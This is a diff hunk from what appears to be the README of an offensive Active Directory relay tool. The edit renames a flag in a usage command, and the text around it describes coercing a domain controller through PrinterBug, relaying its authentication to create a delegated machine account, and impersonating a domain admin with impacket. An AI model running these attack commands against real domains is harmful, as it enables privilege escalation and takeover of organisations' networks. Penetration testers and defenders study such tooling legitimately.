@@ -74,4 +74,4 @@ Forces the PrinterBug-vulnerable domain controller to authenticate to the attack
 controller. A machine account is created and given delegation rights. Upon success, user can use getST.py from impacket 
 to impersonate a domain admin on the newly created machine.
 
- ```python autorelayx.py --delegate -dc <domain controller IP/hostname> -s <PrinterBug-vulnerable domain controller> -u <DOM/user:password>```
+ ```python autorelayx.py --delegate-dc -dc <domain controller IP/hostname> -s <PrinterBug-vulnerable domain controller> -u <DOM/user:password>```
